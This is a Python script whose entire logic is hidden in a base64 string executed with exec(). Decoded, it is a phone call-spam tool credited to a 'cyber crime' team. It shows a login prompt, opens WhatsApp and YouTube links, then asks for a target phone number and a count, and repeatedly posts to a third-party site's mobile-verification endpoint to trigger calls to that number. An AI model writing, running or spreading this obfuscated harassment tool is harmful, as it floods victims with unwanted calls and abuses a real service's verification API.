import base64, sys, time, requests 
from time import sleep 
exec(base64.b64decode("I2ltcG9ydCBiYWhhbgppbXBvcnQgb3Msc3lzLHRpbWUscmVxdWVzdHMKZnJvbSB0aW1lIGltcG9ydCBzbGVlcAoKI0xvZ2luCgp4ID0gJ1NwYW0nCnkgPSAnSW4gRkFHSFAnCgpkZWYgbG9naW4oKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgb3Muc3lzdGVtKCdmaWdsZXQgTG9naW4gfCBsb2xjYXQnKQogICAgcHJpbnQgKCdcMDMzWzM0OzFtWy1dLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tWytdJykKICAgIHByaW50ICgnXDAzM1szNDsxbVstXVwwMzNbMzM7MW1BdXRob3IgXDAzM1szMTsxbTogXDAzM1szMzsxbUZhd3dheiBBbCBHaGFubnkgSGFuYWZpIFB1dHJhIFwwMzNbMzQ7MW1bLV0nKQogICAgcHJpbnQgKCdcMDMzWzM0OzFtWy1dXDAzM1szMzsxbUNvbnRhY3RcMDMzWzMxOzFtOiBcMDMzWzMzOzFtNjI4MTMxMzUzNzk0MyAgICAgICAgICAgICAgICAgXDAzM1szNDsxbVstXScpCiAgICBwcmludCAoJ1wwMzNbMzQ7MW1bLV0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1bLV0nKQogICAgcHJpbnQgKCIiKQogICAgcHJpbnQgKCdcMDMzWzM0OzFtTWFzdWthbiBVc2VyIERlbmdhbiBCZW5hciEnKQogICAgcHJpbnQgKCIiKQogICAgdXNlciA9IGlucHV0KCctPiBcMDMzWzM2OzFtJykKICAgIHNsZWVwKDEpCiAgICBwcmludCAoIiIpCiAgICBwcmludCAoJ1wwMzNbMzQ7MW1NYXN1a2FuIFBhc3cgRGVuZ2FuIEJlbmFyIScpCiAgICBwcmludCAoIiIpCiAgICBwYXN3ID0gaW5wdXQoJy0+IFwwMzNbMzY7MW0nKQogICAgaWYgdXNlciA9PSB4IGFuZCBwYXN3ID09IHk6CiAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICBwcmludCAoJ1wwMzNbMzI7MW1Mb2dpbiBTdWNjZXNzJykKICAgICAgICAgc2xlZXAoMSkKICAgICAgICAgc3lzLmV4aXQKICAgIGVsc2U6CiAgICAgICAgIHByaW50ICgnXDAzM1szMTsxbUxvZ2luIEZhaWwnKQogICAgICAgICBzbGVlcCgyKQogICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd2EubWUvNjI4MTMxMzUzNzk0My8/dGV4dD1Bc3NhbGFtdWFsYWlrdW0rd2FyYWhtYXR1bGxhaGkrd2FiYXJha2F0dWgrU3BhbUNhbGwrQXBhK1Bhc3N3b3JkK0RhbitVc2VybnlhJykKICAgICAgICAgbG9naW4oKQoKCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgICAgbG9naW4oKQoKb3Muc3lzdGVtKCdjbGVhcicpCnNsZWVwKDEpCmRlZiB1cGRhdGVfcHJvZ3Jlc3MocHJvZ3Jlc3MpOgogICAgYmFyTGVuZ3RoID0gMTAKICAgIHN0YXR1cyA9ICIiCiAgICBpZiBpc2luc3RhbmNlKHByb2dyZXNzLCBpbnQpOgogICAgICAgIHByb2dyZXNzID0gZmxvYXQocHJvZ3Jlc3MpCiAgICBpZiBub3QgaXNpbnN0YW5jZShwcm9ncmVzcywgZmxvYXQpOgogICAgICAgIHByb2dyZXNzID0gMAogICAgICAgIHN0YXR1cyA9ICJlcm9yOiBwcm9mcmVzcyB2YXIgbXVzdCBiZSBmbG9hdCBcclxuIgogICAgaWYgcHJvZ3Jlc3MgPCAwOgogICAgICAgIHByb2dyZXNzID0gMAogICAgICAgIHN0YXR1cyA9ICJIYWx0Li4uXHJcbiIKICAgIGlmIHByb2dyZXNzID49IDE6CiAgICAgICAgcHJvZ3Jlc3MgPSAxCiAgICAgICAgc3RhdHVzID0gIkRvbmUgTHVyLi4uXHJcbiIKICAgIGJsb2NrID0gaW50KHJvdW5kKGJhckxlbmd0aCpwcm9ncmVzcykpCiAgICB0ZXh0ID0gIlxyUGVyc2VuIDogW3swfV0gezF9JSB7Mn0iLmZvcm1hdCggIisiKmJsb2NrICsgIuKAoiIqKGJhckxlbmd0aC1ibG9jayksIHByb2dyZXNzKjEwMCwgc3RhdHVzKQogICAgc3lzLnN0ZG91dC53cml0ZSh0ZXh0KQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCgpwcmludCAoJ1wwMzNbMzI7MW0nKQpwcmludCAoJ0xvYWRpbmcgRHVsdSBsdXIuLi4nKQpmb3IgaSBpbiByYW5nZSgxMDEpOgogICAgc2xlZXAoMSkKICAgIHVwZGF0ZV9wcm9ncmVzcyhpLzEwMC4wKQoKcHJpbnQgKCIiKQpwcmludCAoJ1NlbGVzYWknKQpzbGVlcCgyKQpvcy5zeXN0ZW0oJ2NsZWFyJykKb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3lvdXR1YmUuY29tL2NoYW5uZWwvVUNGZ2dmTFdGQ21HR3liMlZIMkVCZkJRJykKb3Muc3lzdGVtKCdjbGVhcicpCnNsZWVwKDEpCm9zLnN5c3RlbSgnZmlnbGV0IFNwYW0gfCBsb2xjYXQnKQpwcmludCAoJ1wwMzNbMzQ7MW1bLV1fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX1stXScpCnByaW50ICgnXDAzM1szNDsxbVstXVwwMzNbMzM7MW1BdXRob3IgXDAzM1szMTsxbTogXDAzM1szMzsxbUZhd3dheiBBbCBHaGFubnkgSGFuYWZpIFB1dHJhICAgICAgICAgXDAzM1szNDsxbVstXScpCnByaW50ICgnXDAzM1szNDsxbVstXVwwMzNbMzM7MW1UZWFtICAgXDAzM1szMTsxbTogXDAzM1szMzsxbU1USSwgV1VLT05HIENZQkVSIENSSU1FLCBTQ1QgICAgICAgICAgXDAzM1szNDsxbVstXScpCnByaW50ICgnXDAzM1szNDsxbVstXVwwMzNbMzM7MW1jb250YWN0XDAzM1szMTsxbTogXDAzM1szMzsxbTYyODEzMTM1Mzc5NDMgICAgICAgICAgICAgICAgICAgICAgICAgXDAzM1szNDsxbVstXScpCnByaW50ICgnXDAzM1szNDsxbVstXVwwMzNbMzM7MW1ZdCAgICAgXDAzM1szMTsxbTogXDAzM1szMzsxbUZBR0hQICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXDAzM1szNDsxbVstXScpCnByaW50ICgnXDAzM1szNDsxbVstXV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fWy1dJykKc2xlZXAoMSkKcHJpbnQgKCIiKQpwcmludCAoJ01hc3VrYW4gTm9tb3IgVGFyZ2V0IERlbmdhbiBCZW5hci4hIEV4YW1wbGUgOiA4eHh4eCcpCnByaW50ICgiIikKbm9tb3IgPSBpbnB1dCgnLT4gXDAzM1szNjsxbScpCnNsZWVwKDEpCnByaW50ICgiIikKcHJpbnQgKCdcMDMzWzM0OzFtTWFzdWthbiBKdW1sYWgnKQpwcmludCAoIiIpCmp1bWxhaCA9IGludChpbnB1dCgnLT4gXDAzM1szNjsxbScpKQpzbGVlcCgxKQpwcmludCAoIiIpCgp1cmwgPSAiaHR0cHM6Ly9pZC5qYWdyZXdhcmQuY29tL21lbWJlci92ZXJpZnktbW9iaWxlLyIKdWEgPSB7J0hvc3QnOiAiaWQuamFncmV3YXJkLmNvbSIsJ0Nvbm5lY3Rpb24nOiAia2VlcC1hbGl2ZSIsJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyB2aXZvIDE3MjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83Ny4wLjM4NjUuNzMgTW9iaWxlIFNhZmFyaS81MzcuMzYnfQpkYXQgPSB7Im1ldGhvZCI6ICJDQUxMIiwiY291bnRyeUNvZGUiOiAiaWQiLH0KCmZvciBpIGluIHJhbmdlKGp1bWxhaCk6CiAgICBzZW5kID0gcmVxdWVzdHMucG9zdCh1cmwrbm9tb3IsIGhlYWRlcnM9dWEsIGRhdGE9ZGF0KQogICAgcHJpbnQgKCJcMDMzWzMyOzFtWytdIFN0YXR1cyBTcGFtaW5nIH4+ICIsKHNlbmQuanNvbigpWyJtZXNzYWdlIl0pKQo="))